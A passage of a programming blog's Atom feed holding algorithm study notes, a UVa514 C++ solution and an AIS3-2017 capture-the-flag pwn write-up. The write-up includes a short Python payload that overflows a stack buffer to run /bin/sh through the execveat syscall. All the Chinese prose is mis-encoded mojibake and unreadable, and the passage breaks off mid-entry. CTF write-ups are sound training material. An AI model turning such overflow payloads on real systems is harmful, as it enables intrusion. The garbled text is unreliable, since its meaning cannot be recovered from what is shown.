    <category term="UVa" scheme="https://twinklestar03.com/categories/Contest/UVa/"/>
    
    
    <category term="UVa1584" scheme="https://twinklestar03.com/tags/UVa1584/"/>
    
    <category term="å­—å…¸åº" scheme="https://twinklestar03.com/tags/%E5%AD%97%E5%85%B8%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::Monotone-Queue/Stack</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-Monotone-Stack/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-Monotone-Stack/</id>
    <published>2019-07-06T16:00:00.000Z</published>
    <updated>2020-12-18T07:32:39.410Z</updated>
    
    <content type="html"><![CDATA[<p>å­¸ç¿’ç­†è¨˜-<strong>Monotone-Queue/Stack</strong></p><a id="more"></a><hr><h1 id="ä»‹ç´¹"><a href="#ä»‹ç´¹" class="headerlink" title="ä»‹ç´¹"></a>ä»‹ç´¹</h1><p>å–®èª¿åˆ—éšŠ-Monotone-Queue/Stack</p><p><strong>å–®èª¿æ€§</strong>ï¼Œæ„æ€å°±æ˜¯è©²åºåˆ—å…§çš„å…ƒç´ æ˜¯å–®èª¿çš„ï¼Œä¾‹å¦‚: {a1, a2, a3, a4, â€¦, an}ï¼Œå…¶ä¸­<strong>æ»¿è¶³a1 &lt;= a2 &lt;= a3 &lt;= â€¦ &lt;= an</strong>ï¼Œæ­¤æ™‚è©²åºåˆ—å³æ˜¯<strong>å–®èª¿éå¢åºåˆ—</strong>ï¼Œ<strong>å–®èª¿éæ¸›åºåˆ—</strong>ä¹Ÿæ˜¯å­˜åœ¨çš„å–”!!</p><p><strong>ç¶­æŒå–®èª¿æ€§</strong>ï¼Œé¡§åæ€ç¾©å°±æ˜¯è¦ç¶­æŒåºåˆ—çš„å–®èª¿æ€§ï¼Œå–®èª¿éå¢åºåˆ—ç¶­æŒæ–¹æ³•:</p><ul><li>å¦‚æœ<strong>åºåˆ—çš„é•·åº¦å›ºå®š</strong>ï¼Œå‰‡<strong>åˆ¤æ–·åºåˆ—é¦–çš„å…ƒç´ æ˜¯å¦æ»¿è¶³æ¢ä»¶</strong>ï¼Œ<strong>ä¸æ»¿è¶³æ¢ä»¶å‰‡æ”¾å¤§åºåˆ—é¦–</strong></li><li>æ¯æ¬¡<strong>åŠ å…¥å…ƒç´ æ™‚èˆ‡åºåˆ—å°¾</strong>æ¯”è¼ƒï¼Œå¦‚æœ<strong>ç•¶å‰å…ƒç´ å°æ–¼åºåˆ—å°¾</strong>ï¼Œ<strong>å°‡åºåˆ—å°¾å…ƒç´ ä¾åºå‡ºåˆ—ç›´åˆ°æ»¿è¶³æ¢ä»¶</strong></li></ul><hr><h1 id="ç¯„ä¾‹å•é¡Œ"><a href="#ç¯„ä¾‹å•é¡Œ" class="headerlink" title="ç¯„ä¾‹å•é¡Œ"></a>ç¯„ä¾‹å•é¡Œ</h1><p><a href="https://zerojudge.tw/ShowProblem?problemid=a813">Zerojudge-a813: åŸå¸‚è§€æ¸¬</a></p><blockquote><p>æœ‰Næ£Ÿæˆ¿å­ã€‚<br>å°æ–¼ä»»æ„ABå…©æ£Ÿæˆ¿å­ï¼Œåªè¦ABä¸­é–“æ²’æœ‰æˆ¿å­çš„é«˜åº¦è¶…éAæˆ–Bï¼Œå‰‡Aå¯çœ‹è¦‹Bã€‚<br>æ±‚1~Næ¯æ£Ÿæˆ¿å­å¯çœ‹è¦‹çš„æˆ¿å­ç¸½æ•¸ã€‚</p></blockquote><p>æ¸¬è³‡ä¸€ï¼Œ0&lt;N&lt;=300ï¼Œ0&lt;H[i]&lt;=1e5ï¼Œ3/17åˆ†<br>æ¸¬è³‡äºŒï¼Œ0&lt;N&lt;=5000ï¼Œ0&lt;H[i]&lt;=1e5ï¼Œ3/17åˆ†<br>æ¸¬è³‡ä¸‰ï¼Œ0&lt;N&lt;=1e6ï¼Œ0&lt;H[i]&lt;=1e9ï¼Œ11/17åˆ†</p><blockquote></blockquote><p>ç¯„ä¾‹æ¸¬è³‡<br>N=2ï¼ŒH={1,1}ï¼Œans=1+1=2<br>N=3ï¼ŒH={1,2,3}ï¼Œans=1+2+1=4<br>N=5ï¼ŒH={5,2,3,4,4}ï¼Œans=4+2+3+3+2=14</p><p>æˆ‘å€‘å…¶å¯¦å¯ä»¥æŠŠè§£æ³•ç°¡åŒ–æˆï¼Œ<strong>Açœ‹çš„åˆ°Bï¼ŒBå°±çœ‹çš„åˆ°A</strong>ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå¤§æ¨“æ’æˆä¸€å€‹ç”±é«˜åˆ°ä½çš„ä¸‰è§’å½¢ï¼Œæ¯æ¬¡pushå€¼é€²å»stackå‰éƒ½æª¢æŸ¥ä¸€ä¸‹æœ‰æ²’æœ‰å¤§æ–¼stack.top()ï¼Œæœ‰çš„è©±å°±æŠŠæ‰€æœ‰å°æ–¼è©²å€¼çš„å…ƒç´ popæ‰ï¼Œç„¶å¾ŒCk+1ï¼Œå› ç‚ºå¾Œé¢çš„å¤§æ¨“ä¹Ÿéƒ½çœ‹ä¸åˆ°é€™äº›è¢«popæ‰çš„å…ƒç´ (Line: 19)</p><figure class="highlight c"><figcaption><span>a813.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ ios::sync_with_stdio(false);cin.tie(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kase, i, b[<span class="number">1000001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;_</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; kase) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; kase; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stk, stk2;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; kase; i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ck = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!stk.empty() &amp;&amp; stk.top() &lt; b[i])    <span class="comment">// ç¶­æŒåš´æ ¼éæ¸›</span></span><br><span class="line">                ck += stk2.top(), stk.pop(), stk2.pop(); <span class="comment">// å› ç‚ºå‡ºç¾æ¯”ä¹‹å‰æ›´é«˜çš„å¤§æ¨“ï¼Œæ‰€ä»¥iä¹‹å¾Œçš„å¤§æ¨“çœ‹ä¸åˆ°å°æ–¼içš„å¤§æ¨“</span></span><br><span class="line">                                                        <span class="comment">// å°±å…ˆæŠŠå¯ä»¥çœ‹åˆ°çš„ç¸½æ•¸åŠ èµ·ä¾†å†popæ‰</span></span><br><span class="line">            <span class="keyword">if</span> (!stk.empty() &amp;&amp; stk.top() == b[i])      <span class="comment">// å‡ºç¾åŒé«˜çš„å¤§æ¨“ï¼Œæ‰€ä»¥åªèƒ½çœ‹åˆ°å¤§æ–¼b[i]é«˜åº¦çš„å¤§æ¨“</span></span><br><span class="line">                ck += stk2.top(), stk2.top()++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                stk.push(b[i]), stk2.push(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (stk.size() &gt; <span class="number">1</span>)                         <span class="comment">// ä¸€å®šå¯ä»¥çœ‹åˆ°å·¦é‚Šçš„å¤§æ¨“ï¼Œå‰é¡Œæ˜¯å·¦é‚Šæœ‰æ±è¥¿</span></span><br><span class="line">                ck++;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; ck &lt;&lt; &quot; &quot;;</span></span><br><span class="line">            ans += ck;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans * <span class="number">2</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å­¸ç¿’ç­†è¨˜-&lt;strong&gt;Monotone-Queue/Stack&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
    <category term="MonotoneStack" scheme="https://twinklestar03.com/tags/MonotoneStack/"/>
    
    <category term="MonotoneQueue" scheme="https://twinklestar03.com/tags/MonotoneQueue/"/>
    
    <category term="Stack" scheme="https://twinklestar03.com/tags/Stack/"/>
    
    <category term="Queue" scheme="https://twinklestar03.com/tags/Queue/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::DynamicProgramming</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-DynamicProgramming/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-DynamicProgramming/</id>
    <published>2019-07-03T16:00:00.000Z</published>
    <updated>2020-12-18T07:32:59.639Z</updated>
    
    <content type="html"><![CDATA[<p>å­¸ç¿’ç­†è¨˜-<strong>DynamicProgramming</strong></p><a id="more"></a><hr><p>å‹•æ…‹è¦åŠƒ-DynamicProgrammingï¼Œä»¥ä¸‹ç°¡ç¨±DPï¼Œæ˜¯ä¸€ç¨®æŠŠå¤§å•é¡Œç´°åˆ†æˆå°å•é¡Œçš„æ¼”ç®—æ³•è¨­è¨ˆæ–¹æ³•ã€‚</p><p>å¯ä»¥æŠŠåŸå•é¡Œåˆ†è§£æˆæ›´å¤šå°å•é¡Œä¾†è§£æ±ºï¼Œä¾‹å¦‚éšå±¤: n!æºè‡ªn-1!â€¦..å¦‚æ­¤åè¦†ä¸‹å»å¯ä»¥åˆ°1ï¼Œæ‰€ä»¥æˆ‘å€‘æ˜¯å¯ä»¥æ…¢æ…¢æ¨ä¸Šä¾†ä¸¦å»ºå€‹è¡¨!</p><hr><h1 id="æ­¥é©Ÿ"><a href="#æ­¥é©Ÿ" class="headerlink" title="æ­¥é©Ÿ"></a>æ­¥é©Ÿ</h1><ol><li>å»ºç«‹è¶³å¤ å¤§çš„è¡¨æ ¼</li><li>æ¨å°ç¬¬ N é …èˆ‡å‰ N-1 é …çš„é—œä¿‚ã€‚</li><li>å°‡çš„å‰é¢å¹¾é …çš„å€¼å¯«é€²å»ã€‚</li><li>å¾çš„æœ€å°é …æ¬¡(å‡è¨­ç‚º M)é–‹å§‹ï¼Œåˆ©ç”¨è¿´åœˆè¨ˆç®—å‡ºå¾ç¬¬ M é …åˆ°ç¬¬ N é …æ¯ä¸€é …çš„å€¼ã€‚</li></ol><hr><h1 id="é¡Œç›®"><a href="#é¡Œç›®" class="headerlink" title="é¡Œç›®"></a>é¡Œç›®</h1><p>è·¯å¾‘å•é¡Œï¼š</p><p>å¦‚ä¸‹åœ–ï¼Œæœ‰ä¸€å€‹ NxN çš„æ–¹æ ¼(N&lt;=10)ï¼Œæˆ‘å€‘å¾å·¦ä¸Šè§’çš„ O (0, 0) é»é–‹å§‹ç§»å‹•ï¼Œå¯ä»¥ç§»å‹•çš„æ–¹å‘ç‚ºï¼šå¾€å³ã€å¾€ä¸‹ã€å¾€å³ä¸‹ä¸‰å€‹æ–¹å‘ã€‚ç¾åœ¨è¼¸å…¥å…©å€‹æ•´æ•¸ xã€yï¼Œè«‹ä½ è¨ˆç®—å‡ºå¾ (0, 0) èµ°åˆ° (x, y) å…±æœ‰å¹¾ç¨®èµ°æ³•ã€‚</p><img src="/images/StarNote/DP/square.jpg" class="" title="èµ°æ ¼å­å•é¡Œ(From sagit C++)"><p>**f(x, y)**ç•¶ä½œæ±‚èµ°åˆ°(x, y)çš„æ–¹æ³•æ•¸ã€‚</p><p>è¦æ±‚èµ°åˆ°<strong>f(x, y)**ä¸Šçš„æ–¹æ³•æ•¸å°±æ˜¯</strong>f(x - 1, y) + f(x, y - 1) + f(x - 1, y - 1)**!!</p><p>æ‰€ä»¥å¯ä»¥ä¾ç…§é€™æ¨£çš„è¦å‰‡ä¾†å»ºè¡¨ï¼Œä¹‹å¾Œåªè¦ç”¨æŸ¥è©¢çš„å°±å¥½äº†!</p><img src="/images/StarNote/DP/square-2.PNG" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¼¸å…¥1ï¼š3 7</span><br><span class="line"></span><br><span class="line">è¼¸å‡º1ï¼š575</span><br><span class="line"></span><br><span class="line">è¼¸å…¥2ï¼š10 10</span><br><span class="line"></span><br><span class="line">è¼¸å‡º2ï¼š8097453</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    è·¯å¾‘å•é¡Œï¼š</span></span><br><span class="line"><span class="comment">    æœ‰ä¸€å€‹ NxN çš„æ–¹æ ¼(N&lt;=10)ï¼Œæˆ‘å€‘å¾å·¦ä¸Šè§’çš„ O (0, 0) é»é–‹å§‹ç§»å‹•ï¼Œ</span></span><br><span class="line"><span class="comment">    å¯ä»¥ç§»å‹•çš„æ–¹å‘ç‚ºï¼šå¾€å³ã€å¾€ä¸‹ã€å¾€å³ä¸‹ä¸‰å€‹æ–¹å‘ã€‚ç¾åœ¨è¼¸å…¥å…©å€‹æ•´æ•¸ xã€yï¼Œ</span></span><br><span class="line"><span class="comment">    è«‹ä½ è¨ˆç®—å‡ºå¾ (0, 0) èµ°åˆ° (x, y) å…±æœ‰å¹¾ç¨®èµ°æ³•ã€‚</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Solution: DP (Bottom-Up)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXM 11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vec[MAXM][MAXM];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXM; i++)</span><br><span class="line">        vec[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXM; i++)</span><br><span class="line">        vec[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; MAXM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; MAXM; j++) &#123;</span><br><span class="line">            vec[i][j] = vec[i<span class="number">-1</span>][j] + vec[i][j<span class="number">-1</span>] + vec[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, vec[x][y]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å­¸ç¿’ç­†è¨˜-&lt;strong&gt;DynamicProgramming&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="DynamicProgramming" scheme="https://twinklestar03.com/tags/DynamicProgramming/"/>
    
    <category term="DP" scheme="https://twinklestar03.com/tags/DP/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Uva514-Rail::è§£é¡Œéç¨‹</title>
    <link href="https://twinklestar03.com/Contest/UVa/UVa514-Rail/"/>
    <id>https://twinklestar03.com/Contest/UVa/UVa514-Rail/</id>
    <published>2019-06-30T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:54.109Z</updated>
    
    <content type="html"><![CDATA[<p>é€™é¡Œæ˜¯UVa514-Railä½†æ˜¯æˆ‘ç”¨Zerojudgeæ¸¬ï¼Œä¸€é¡Œå°å“é¡Œ~</p><a id="more"></a><hr><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><hr><p><a href="https://zerojudge.tw/ShowProblem?problemid=c123">é»æˆ‘çœ‹é¡Œç›®!</a></p><p>å…¶å¯¦é€™é¡Œå°±æ˜¯åœ¨è€ƒStackï¼Œç„¶å¾Œæ¨¡æ“¬Stackçš„é‹ä½œï¼Œç›´æ¥ä¸ŠAC Code!</p><figure class="highlight c"><figcaption><span>UVa514.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T) &amp;&amp; (T &amp;&amp; T)) &#123; <span class="comment">// ç•¶è¼¸å…¥ç‚º0æ™‚è·³å‡º</span></span><br><span class="line">        <span class="keyword">int</span> train[T];</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;train[<span class="number">0</span>]) &amp;&amp; (train[<span class="number">0</span>] &amp;&amp; train[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; T; i++) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;train[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; st; <span class="comment">// æ¨¡æ“¬ä¸€å€‹Stack</span></span><br><span class="line">            <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= T; i++) &#123; <span class="comment">// ä¾ç…§1~nçš„é †åºpushé€²stack</span></span><br><span class="line">                st.push_back(i);</span><br><span class="line">                <span class="keyword">while</span> (st.size() &amp;&amp; st.back() == train[idx]) &#123;</span><br><span class="line">                    idx++;</span><br><span class="line">                    st.pop_back();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, st.size() ? <span class="string">&quot;No&quot;</span> : <span class="string">&quot;Yes&quot;</span>); <span class="comment">// å¦‚æœçµæŸå¾ŒStackå…§é‚„æœ‰æ±è¥¿ä»£è¡¨é€™ä¸²è¼¸å…¥ä¸åˆæ ¼</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é€™é¡Œæ˜¯UVa514-Railä½†æ˜¯æˆ‘ç”¨Zerojudgeæ¸¬ï¼Œä¸€é¡Œå°å“é¡Œ~&lt;/p&gt;</summary>
    
    
    
    <category term="Contest" scheme="https://twinklestar03.com/categories/Contest/"/>
    
    <category term="UVa" scheme="https://twinklestar03.com/categories/Contest/UVa/"/>
    
    
    <category term="Stack" scheme="https://twinklestar03.com/tags/Stack/"/>
    
    <category term="UVa514" scheme="https://twinklestar03.com/tags/UVa514/"/>
    
  </entry>
  
  <entry>
    <title>AIS3-2017::Pwn-Endè§£é¡Œéç¨‹</title>
    <link href="https://twinklestar03.com/Contest/CTF/AIS3_2017_End/"/>
    <id>https://twinklestar03.com/Contest/CTF/AIS3_2017_End/</id>
    <published>2019-06-25T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:20.196Z</updated>
    
    <content type="html"><![CDATA[<p>å› ç‚ºå–œæ­¡ä¸ŠPwnæ‰€ä»¥æƒ³è¦åŠ å¼·å¯¦åŠ›ï¼Œç„¶å¾Œå°±åœ¨ç¶²è·¯ä¸Šæ‰¾æ‰¾å¤é¡Œä¾†è§£ï¼Œå¸Œæœ›å¯ä»¥å­¸åˆ°é»æ±è¥¿!</p><p>åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°äº†é€™é¡ŒAIS3-2017çš„é¡Œç›®ï¼ŒPwn-endã€‚</p><a id="more"></a><hr><h2 id="0x01-åˆ†ææ¼æ´"><a href="#0x01-åˆ†ææ¼æ´" class="headerlink" title="0x01 åˆ†ææ¼æ´"></a>0x01 åˆ†ææ¼æ´</h2><p>è¼‰ä¸‹ä¾†æœ‰å€‹ELF Executableï¼Œç›´æ¥æ‹¿IDAçªºè¦–è£¡é¢æœ‰ç”šéº¼ã€‚<br><img src="/images/AIS3_end/disass.png" alt="Disass"></p><p><code>_start</code>æ˜¯åˆå§‹åŒ–çš„éƒ¨åˆ†ï¼Œæ¯å€‹registeréƒ½è¢«æ­¸é›¶äº†ã€‚</p><p>ç„¶å¾Œçœ‹åˆ°<code>_end</code>è£¡é¢æœ‰é–‹é—¢ä¸€å¡Š0x128çš„bufferï¼Œç„¶å¾Œ<code>edx = 0x148</code>ï¼Œä¹‹å¾Œå‘¼å«äº†<code>syscall</code>ï¼Œå› ç‚ºå…ˆå‰çš„<code>xor rax, rax</code>æ‰€ä»¥<code>rax=0</code>æ‰€ä»¥syscallæœƒå‘¼å«åˆ°<code>sys_read(0, rsi, 0x148)</code>ã€‚</p><p>åˆ°é€™é‚Šæ¼æ´å·²ç¶“æ¢é ­äº†ï¼Œå› ç‚º<code>edx = 0x148</code>æ‰€ä»¥<code>sys_read</code>å¯ä»¥readé€²0x148å€‹byteï¼Œä½†æ˜¯é–‹å‡ºä¾†çš„bufferåªæœ‰0x128å€‹byteï¼Œ<strong>Stack BufferOverflow Confirm!!</strong></p><hr><h2 id="0x02-å»ºæ§‹Payload"><a href="#0x02-å»ºæ§‹Payload" class="headerlink" title="0x02 å»ºæ§‹Payload"></a>0x02 å»ºæ§‹Payload</h2><p>ä½†è¦æ€éº¼åˆ©ç”¨é€™å€‹æ´Spawn a shellå‘¢? åœ¨<code>_start</code>ä¸­ä¸‹é¢é‚„æœ‰ä¸€å€‹<code>syscall</code>ï¼Œé‚£æ‡‰è©²å¯ä»¥ç”¨ä»–ä¾†åŸ·è¡Œ<code>sys_execve</code>å§~</p><p>ä½†æ˜¯â€¦.æˆ‘å€‘å¯ä»¥æ§åˆ¶çš„registeråªæœ‰rsi**(buf)<strong>è·Ÿrax</strong>(Function returnæ”¾raxï¼Œæ‰€ä»¥å¯ä»¥é€éæ§åˆ¶è¼¸å…¥çš„å­—å…ƒé•·åº¦ä¾†æ§åˆ¶rax)**ï¼Œä½†rdiä¸èƒ½æ§åˆ¶æ‰€ä»¥ä¸èƒ½æ­£å¸¸çš„åŸ·è¡Œ<code>/bin/sh</code>â€¦.</p><p>å›é ­çˆ¬çˆ¬Syscall tableï¼Œç™¼ç¾æœ‰ä¸€å€‹æ€§è³ªæ¥è¿‘ä¹Ÿå¯ä»¥åŸ·è¡Œæª”æ¡ˆçš„å‡½æ•¸<code>stub_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user*const __user *envp, int flags)</code></p><p>Hey!é€™æ¨£å­å¥½åƒè¡Œå¾—é€šï¼Œ<code>*filename</code>é€™åƒæ•¸å¯ä»¥æ§åˆ¶äº†å› ç‚ºä»–åƒçš„æ˜¯rsiï¼Œç„¶å¾Œå‘¼å«ä»–çš„æ–¹æ³•æ˜¯æŠŠraxè¨­å®šæˆ322ï¼Œæ‰€ä»¥<strong>è¼¸å…¥å­—ä¸²é•·åº¦è¦æ˜¯322</strong>ï¼Œ<strong>ä½†æ˜¯è¦æ³¨æ„è¦æŠŠrdxæ¸…ç©ºï¼Œä¸ç„¶æœƒçˆ›æ‰ã€‚</strong></p><p>æŠŠrdxæ¸…ç©ºä¸é›£ï¼Œåœ¨_startå‰é¢æœ‰<code>xor rdx, rdx</code>ï¼ŒStackéƒ½å¯ä»¥è¢«<del>çŒæ»¿äº†///</del>è·³éå»å°±ä¸æ˜¯å•é¡Œäº†ã€‚</p><p>æ‰€ä»¥è¼¸å…¥è¦æ˜¯<code>/bin/sh\x00</code> + å¡0x120å€‹byteä¾†å¡«buf + <code>xor rdx rdx</code>çš„address + æ›´å¤šåƒåœ¾byteä¾†æ¹Šé•·åº¦ã€‚</p><hr><h2 id="0x03-ç”ŸæˆPayload"><a href="#0x03-ç”ŸæˆPayload" class="headerlink" title="0x03 ç”ŸæˆPayload"></a>0x03 ç”ŸæˆPayload</h2><figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">padding = <span class="string">&#x27;A&#x27;</span> * (<span class="number">296</span> - <span class="number">8</span>) <span class="comment"># å¡«å‰©ä¸‹ä¾†çš„buf</span></span><br><span class="line">xor_rdx_rdx = <span class="string">&#x27;\xed\x00\x40\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">print(filename + padding + (xor_rdx_rdx)*<span class="number">3</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="0xFF-çµèª"><a href="#0xFF-çµèª" class="headerlink" title="0xFF çµèª"></a>0xFF 